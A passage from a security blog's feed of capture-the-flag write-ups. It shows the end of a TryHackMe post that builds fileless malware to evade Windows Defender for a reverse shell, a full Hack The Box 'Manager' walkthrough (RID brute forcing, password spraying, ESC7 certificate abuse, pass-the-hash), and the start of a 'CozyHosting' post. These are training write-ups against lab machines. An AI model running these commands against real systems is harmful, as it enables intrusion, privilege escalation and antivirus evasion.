<p>To establish persistence a new user can quickly be created and added to the <code>administrators</code> group to gain admin privileges.</p>
<pre tabindex="0"><code>net user &lt;username&gt; &lt;password&gt; /add
net localgroup administrators &lt;username&gt; /add
</code></pre><p><img src="/images/THM-HackSmarterSecurity/persistence-account.png" alt="Persistence is achieved via the creation of a new privileged user"></p>
<p>The newly created account can then be used to access the system via SSH.</p>
<p><img src="/images/THM-HackSmarterSecurity/persistence-account-privs.png" alt="Privileges of the newly created admin account"></p>
<h4 id="which-organizations-is-the-hack-smarter-group-targeting-next">Which organizations is the Hack Smarter group targeting next?</h4>
<p>Since we have admin privileges we can access the list of the next targets at <code>C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt</code>.</p>
<p><img src="/images/THM-HackSmarterSecurity/hacking-targets.png" alt="Hackers&rsquo; targets list"></p>
<h3 id="using-fileless-malware">Using fileless malware</h3>
<p>Another method to bypass Windows Defender is to use <a href="https://github.com/daniellowrie/update_script" target="_blank" >SecUp</a>

. It is a &ldquo;fileless malware that bypasses Windows Defender using PowerShell and obfuscation.&rdquo; You can also check the <a href="https://www.youtube.com/watch?v=LjoAV3O40og&amp;ab_channel=DanielLowrie" target="_blank" >YouTube video</a>

 for an explanation.</p>
<ol>
<li>Clone the repository</li>
</ol>
<pre tabindex="0"><code>git clone https://github.com/daniellowrie/update_script
</code></pre><ol start="2">
<li>Start the engine. It also starts an HTTP server to transfer the malcious files.</li>
</ol>
<pre tabindex="0"><code>go run SecUp.go 10.2.104.130
</code></pre><p><img src="/images/THM-HackSmarterSecurity/go-run.png" alt="go run command"></p>
<ol start="3">
<li>Set up a listener on port 443</li>
</ol>
<pre tabindex="0"><code>nc -lnvp 443
</code></pre><ol start="4">
<li>The compilation process creates a file named <code>update_script.exe</code></li>
</ol>
<pre tabindex="0"><code>GOOS=windows go build update_script.go
</code></pre><p><img src="/images/THM-HackSmarterSecurity/malware-exe.png" alt="files compilation"></p>
<ol start="5">
<li>Rename the malicious file as <code>spoofer-scheduler.exe</code> to make it work on the target.</li>
</ol>
<pre tabindex="0"><code>mv update_script.exe spoofer-scheduler.exe
</code></pre><p>On the target stop the service, replace the legitimate file with your malicious file and restart the service. You should see the files getting uploaded on the target.</p>
<p><img src="/images/THM-HackSmarterSecurity/malware-success.png" alt="Malware working successfully"></p>
<p>On the listener we get a shell with admin privileges that does not die.</p>
<p><img src="/images/THM-HackSmarterSecurity/admin-shell.png" alt="Stable shell that does not die received"></p>
<p>And that&rsquo;s all I have for you on this one! There are many more ways to evade antiviruses/EDRs, one of which is <a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" target="_blank" >AMSI Bypass</a>

, I encourage you to learn and practice different methods. If you are into books I highly recommend <a href="https://www.amazon.com/Evading-EDR-Definitive-Defeating-Detection/dp/1718503342" target="_blank" >Evading EDR: The Definitive Guide to Defeating Endpoint Detection Systems</a>

 and <a href="https://www.amazon.com/Antivirus-Bypass-Techniques-practical-techniques/dp/1801079749" target="_blank" >Antivirus Bypass Techniques</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Manager</title>
            <link>https://scorpiosec.com/posts/2024/03/htb-manager/</link>
            <pubDate>Fri, 15 Mar 2024 22:14:37 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/03/htb-manager/</guid>
            <description>Platform: Hack The Box Link: Manager Level: Medium OS: Windows Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in addtion to various other services. The target is vulnerable to RID brute forcing and ESC7 (Vulnerable Certificate Authority Access Control).
The target IP address is 10.10.11.236
Scanning I first check all the open ports.
nmap 10.10.11.236 -p- -T4 -Pn --open Starting Nmap 7.94SVN ( https://nmap.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Manager" target="_blank" >Manager</a>

</li>
<li>Level: Medium</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in addtion to various other services. The target is vulnerable to RID brute forcing and ESC7 (Vulnerable Certificate Authority Access Control).</p>
<p>The target IP address is <code>10.10.11.236</code></p>
<h2 id="scanning">Scanning</h2>
<p>I first check all the open ports.</p>
<pre tabindex="0"><code>nmap 10.10.11.236 -p- -T4 -Pn --open
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-13 13:38 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.236
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
</span></span><span style="display:flex;"><span>53/tcp    open  domain
</span></span><span style="display:flex;"><span>80/tcp    open  http
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s
</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
</span></span><span style="display:flex;"><span>9389/tcp  open  adws
</span></span><span style="display:flex;"><span>49667/tcp open  unknown
</span></span><span style="display:flex;"><span>49669/tcp open  unknown
</span></span><span style="display:flex;"><span>49671/tcp open  unknown
</span></span><span style="display:flex;"><span>49727/tcp open  unknown
</span></span><span style="display:flex;"><span>57702/tcp open  unknown
</span></span><span style="display:flex;"><span>58902/tcp open  unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 107.12 seconds
</span></span></code></pre></div><p>And I run another scan to get more information about services and their versions.</p>
<pre tabindex="0"><code>nmap -sC -sV --open 10.10.11.236
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-13 13:46 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.236
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">987</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>|_http-title: Manager
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-03-14 01:45:32Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style="display:flex;"><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
</span></span><span style="display:flex;"><span>|   10.10.11.236:1433: 
</span></span><span style="display:flex;"><span>|     Target_Name: MANAGER
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: MANAGER
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC01
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: manager.htb
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: dc01.manager.htb
</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: manager.htb
</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
</span></span><span style="display:flex;"><span>| ms-sql-info: 
</span></span><span style="display:flex;"><span>|   10.10.11.236:1433: 
</span></span><span style="display:flex;"><span>|     Version: 
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>|       Service pack level: RTM
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2024-03-06T12:01:23
</span></span><span style="display:flex;"><span>|_Not valid after:  2054-03-06T12:01:23
</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-03-14T01:46:19
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h58m40s, deviation: 0s, median: 6h58m39s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 95.25 seconds
</span></span></code></pre></div><p>Many services are running on this machine, I notice the domain controller <code>manager.htb</code> and I add it to the <code>/etc/hosts</code> file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.236 manager.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The website does not provide anything valuable, it is a basic static website with no working functionalities.</p>
<p><img src="/images/HTB-Manager/website.png" alt="Manager-Website"></p>
<p>Gobuster does not provide anything valuable either.</p>
<p>I then try to enumerate SMB. I can access it as a guest but there is nothing of interest here.</p>
<pre tabindex="0"><code>smbmap -H 10.10.11.236 -u guest
</code></pre><p><img src="/images/HTB-Manager/smb-guest.png" alt="SMB-guest-login"></p>
<p>I know that Active Directory is running on the target so I attempt RID brute forcing.</p>
<blockquote>
<p>RID stands for Relative Identifier. It is a unique identifier assigned to each security principal (such as users, groups, and computers) within a Windows domain. RID brute forcing, also known as RID cycling or RID enumeration, is a technique used by attackers to identify valid user accounts within a Windows domain by guessing or cycling through RID values.</p>
</blockquote>
<pre tabindex="0"><code>crackmapexec smb manager.htb -u guest -p &#39;&#39; --rid-brute
</code></pre><p><img src="/images/HTB-Manager/rid-bruteforcing.png" alt="RID-Brute-forcing"></p>
<p>I only want the lines with the usernames so I copy them into a file (start from user <code>Zhong</code>).</p>
<p><img src="/images/HTB-Manager/smb-list.png" alt="Users-from-RID-brute-forcing"></p>
<p>I extract the usernames from it and I send the output to another file.</p>
<pre tabindex="0"><code>awk -F&#39;: &#39; &#39;{split($NF, a, &#34;\\&#34;); split(a[2], b, &#34; &#34;); print tolower(b[1])}&#39; smb-output.txt &gt; smb-users.txt
</code></pre><p><img src="/images/HTB-Manager/smb-users.png" alt="Domain-users-list"></p>
<p>Now I test if some users have their passwords as their username.</p>
<pre tabindex="0"><code>crackmapexec smb manager.htb -u $(cat ~/Machines/HTB/Manager/smb-users.txt) -p $(cat ~/Machines/HTB/Manager/smb-users.txt) --continue-on-success
</code></pre><p>The pair <code>operator:operator</code> is successful!</p>
<p><img src="/images/HTB-Manager/smb-login.png" alt="SMB-login-credentials"></p>
<p>There are no shares accessible with this user so I turned my attention to the MSSQL database.</p>
<pre tabindex="0"><code>crackmapexec mssql manager.htb -u operator -p operator
</code></pre><p>Turns out I can access the database with those same smb credentials.</p>
<p><img src="/images/HTB-Manager/MSSQL-login.png" alt="MSSQL-login-credentials"></p>
<pre tabindex="0"><code>impacket-mssqlclient operator:operator@dc01.manager.htb -windows-auth
</code></pre><p><img src="/images/HTB-Manager/MSSQL-ACCESS.png" alt="MSSQL-database-accessed"></p>
<p>I try enabling <code>xp_cmdshell</code> but it fails.</p>
<blockquote>
<p><code>xp_cmdshell</code> is a system stored procedure in Microsoft SQL Server that allows users to execute operating system commands directly from within SQL Server. It is a powerful feature that provides a way to interact with the underlying operating system from within the SQL Server environment.</p>
</blockquote>
<p><img src="/images/HTB-Manager/xp-cmdshell.png" alt="xp-cmdshell-failure"></p>
<p>I list the directories with <code>xp_dirtree</code>, Microsoft IIS web root is found at <code>C:\inetpub\wwwroot</code>.</p>
<pre tabindex="0"><code>xp_dirtree C:\inetpub\wwwroot
</code></pre><p><img src="/images/HTB-Manager/xp_dirtree.png" alt="MSSQL-database-accessed"></p>
<p>I see a backup file called <code>website-backup-27-07-23-old.zip</code> that I download with <code>wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip</code>.</p>
<p>After unziping the archive I notice a hidden file called <code>.old-conf.xml</code>.</p>
<p><img src="/images/HTB-Manager/xml-file.png" alt="old-conf-xml-file"></p>
<p>It contains credentials for the user <code>raven</code>.</p>
<p><img src="/images/HTB-Manager/raven-user-credentials.png" alt="raven-user-credentials"></p>
<h2 id="foothold">Foothold</h2>
<blockquote>
<p>From the nmap results I know that port <code>5985</code> was open, which is typically used for <code>WinRM (Windows Remote Management)</code> service.</p>
</blockquote>
<p>These credentials allow me to get a foothold on the target.</p>
<pre tabindex="0"><code>evil-winrm -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -i manager.htb
</code></pre><p><img src="/images/HTB-Manager/foothold.png" alt="Foothold-via-evil-WinRM"></p>
<h3 id="user-flag">user flag</h3>
<p>The user flag <code>user.txt</code> is at <code>C:\Users\Raven\Desktop\user.txt</code>.</p>
<p><img src="/images/HTB-Manager/user-flag.png" alt="Foothold-via-evil-WinRM"></p>
<p>I get more information about the system just in case I need to look for some vulnerabilities specific to the OS version. I do so with <code>get-computerinfo</code>.</p>
<p><img src="/images/HTB-Manager/computerinfo.png" alt="Target-system-info"></p>
<p>Knowing that I am in an Active Directory environment I check the access rights of the users with <code>certify</code>, the executable is available <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" >here</a>

.</p>
<p><img src="/images/HTB-Manager/CA-rights.png" alt="Principal-rights-enumeration"></p>
<p>The user <code>raven</code> has the the rights to manage the Certificate Authority and to request and enroll certificates from the Certificate Authority.</p>
<p>The CA used is <code>manager-DC01-CA</code>.</p>
<p><img src="/images/HTB-Manager/certutil.png" alt="Certificate-Authority-information"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>The certificate vulnerability (ESC7) exploitation is explained in details <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2" target="_blank" >here</a>

.</p>
<blockquote>
<p>&ldquo;The technique relies on the fact that users with the <code>Manage CA</code> and <code>Manage Certificates</code> access right can issue failed certificate requests. The <code>SubCA</code>
certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the <code>SubCA</code> - which will be denied - but then issued by the manager afterwards.&rdquo;</p>
</blockquote>
<ol>
<li>You grant yourself the <code>Manage Certificates</code> access right by adding the user as a new officer.</li>
</ol>
<pre tabindex="0"><code>certipy ca -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -add-officer raven
</code></pre><p><img src="/images/HTB-Manager/CA1.png" alt="Add-officer-Raven"></p>
<ol start="2">
<li>The <code>SubCA</code> template can be <strong>enabled on the CA</strong> with the <code>-enable-template</code> parameter.</li>
</ol>
<pre tabindex="0"><code>certipy ca -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39;
</code></pre><p><img src="/images/HTB-Manager/CA2.png" alt="Enable-SubCA"></p>
<ol start="3">
<li>We start by requesting a certificate based on the SubCA template. This request will be denied, but we will save the private key and note down the request ID. make sure you are running the command from a directory where you have writing rights, otherwise the <code>.key</code> will not be written.</li>
</ol>
<pre tabindex="0"><code>certipy req -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
</code></pre><p><img src="/images/HTB-Manager/CA3.png" alt="Certificate-private-key"></p>
<ol start="4">
<li>With the <code>Request ID</code>, issue a certificate. You do so with <code>-issue-request &lt;request ID&gt;</code></li>
</ol>
<pre tabindex="0"><code>certipy ca -ca &#39;manager-DC01-CA&#39; -issue-request 24 -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236
</code></pre><p><img src="/images/HTB-Manager/CA4.png" alt="Certificate-issued-successfully"></p>
<ol start="5">
<li>Retrieve the issued certificate with the <code>req</code> command and the <code>-retrieve &lt;request ID&gt;</code> parameter.</li>
</ol>
<pre tabindex="0"><code>certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca manager-DC01-CA -target manager.htb -retrieve 24 -dc-ip 10.10.11.236
</code></pre><p><img src="/images/HTB-Manager/CA5.png" alt="Certificate-retrieved"></p>
<ol start="6">
<li>The execution of the next commands will require clock synchronization with the DC. In order for this to work, we can use <code>ntpdate</code>.</li>
</ol>
<blockquote>
<p>This step is very time sensitive, you need to run these commands quickly. If you aren&rsquo;t able to make it work, I recommend chaining the commands together after running <code>sudo ntpdate -u manager.htb</code>.</p>
</blockquote>
<p>Failing to execute the commands fast enough will lead to this error.</p>
<p><img src="/images/HTB-Manager/Clock-error.png" alt="Clock-skew-error"></p>
<p>Run the command below and quickly execute the second command with <code>certipy auth</code>.</p>
<pre tabindex="0"><code>sudo ntpdate -u manager.htb
</code></pre><p><img src="/images/HTB-Manager/CLOCK-SYNC.png" alt="ntpdate-clock-sync"></p>
<pre tabindex="0"><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
</code></pre><p>We get a TGT ticket and the administrator hash. Both can be used to get administrative privileges. You can login with the hash using <code>evil-winrm</code> or you can pass the ticket with <code>impacket</code>.</p>
<p><img src="/images/HTB-Manager/CA6.png" alt="TGT-Ticket-and-admin-hash"></p>
<h3 id="evil-winrm-method">evil-winrm method</h3>
<pre tabindex="0"><code>evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
</code></pre><p><img src="/images/HTB-Manager/evil-winrm-root.png" alt="admin-shell-evil-WinRM"></p>
<h3 id="pass-the-ticket-method">Pass the ticket method</h3>
<blockquote>
<p>This method is subject to <code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> so you will need to to reuse the <code>ntpdate</code> command again before using <code>impacket</code>.</p>
</blockquote>
<p>To pass the ticket I first need to export it. You can read more about it <a href="https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate" target="_blank" >here</a>

.</p>
<pre tabindex="0"><code>export KRB5CCNAME=administrator.ccache
</code></pre><p>Then I login to the DC</p>
<pre tabindex="0"><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
</code></pre><p>And we are in with a privileged account!</p>
<p><img src="/images/HTB-Manager/CA7.png" alt="Impacket-privileged-account"></p>
<h3 id="chained-commands-method">Chained commands method</h3>
<p>Chaining the commands might be the solution for you if you are unable to run them fast enough individually. Still you will probably need to try multiple times, just remember to be fast.</p>
<pre tabindex="0"><code>sudo ntpdate -u manager.htb
</code></pre><pre tabindex="0"><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 &amp;&amp; export KRB5CCNAME=administrator.ccache &amp;&amp; python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
</code></pre><p><img src="/images/HTB-Manager/CA-chain-cmds.png" alt="ESC7-with-chained-commands"></p>
<h2 id="root-flag">Root flag</h2>
<p>The root flag <code>root.txt</code> is at <code>c:\Users\Administrator\Desktop</code></p>
<p><img src="/images/HTB-Manager/root-flag.png" alt="root-flag"></p>
<p>This is all for this challenge, I hope this writeup for helpful! Stay tuned for more and feel free to reach me out on X at <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: CozyHosting</title>
            <link>https://scorpiosec.com/posts/2024/03/htb-cozyhosting/</link>
            <pubDate>Sat, 02 Mar 2024 11:10:54 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/03/htb-cozyhosting/</guid>
            <description>Platform: Hack The Box Link: CozyHosting Level: Easy OS: Linux CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection.
The target IP address is 10.10.11.230
Scanning sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230 We have a Linux machine Running a web application on port 80 The SSH service is enabled on the target Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:21 CST Nmap scan report for cozyhosting.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/CozyHosting" target="_blank" >CozyHosting</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection.</p>
<p>The target IP address is <code>10.10.11.230</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230
</code></pre><ul>
<li>We have a Linux machine</li>
<li>Running a web application on port 80</li>
<li>The SSH service is enabled on the target</li>
</ul>
<pre tabindex="0"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:21 CST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
</code></pre><p>Let&rsquo;s add the target to our host directory by adding <code>10.10.11.230 cozyhosting.htb</code> to the <code>/etc/hosts</code> file.</p>
<p>Let&rsquo;s check the application by visiting <code>http://cozyhosting.htb</code>. This is a hosting service, the <code>Home</code>, <code>Services</code>, and <code>Pricing</code> links don&rsquo;t do anything special.</p>
<p><img src="/images/HTB-CozyHosting/cozyhosting.png" alt="cozyhosting-website"></p>
<p>The <code>Login</code> button leads you to a login page with url <code>cozyhosting.htb/login</code>.</p>
<p><img src="/images/HTB-CozyHosting/cozyhosting-login.png" alt="cozyhosting-login-form"></p>
<p>First we use <code>Gobuster</code> to find any potential hidden directories, I am using <a href="https://github.com/danielmiessler/SecLists" target="_blank" >SecLists</a>

.</p>
<pre tabindex="0"><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
</code></pre><p><img src="/images/HTB-CozyHosting/gobuster-medium.png" alt="cozyhosting-Gobuster"></p>
<p><code>/admin</code> and <code>/logout</code> sends you to the login page. With <code>/error</code> you get to a page with this message.</p>
<p><img src="/images/HTB-CozyHosting/whitelabel-error.png" alt="cozyhosting-error-page"></p>
<p>I don&rsquo;t know what this error means so I google it and I learn that it is a Spring Boot error. Reading more about it I discover that it indicates that the Spring Boot application does not have a specific endpoint or route defined for handling the <code>/error</code> path and that they might be more endpoints in the application.</p>
<blockquote>
<p>Check this stackoverflow page <a href="https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error" target="_blank" >Whitelabel Error Page</a>

</p>
</blockquote>
<p>I go back to gobuster for a more specific directory enumeration. SecLists has a list for spring boot that we can use.</p>
<pre tabindex="0"><code>gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb
</code></pre><p><img src="/images/HTB-CozyHosting/gobuster-springboot.png" alt="cozyhosting-Gobuster-spring-boot"></p>
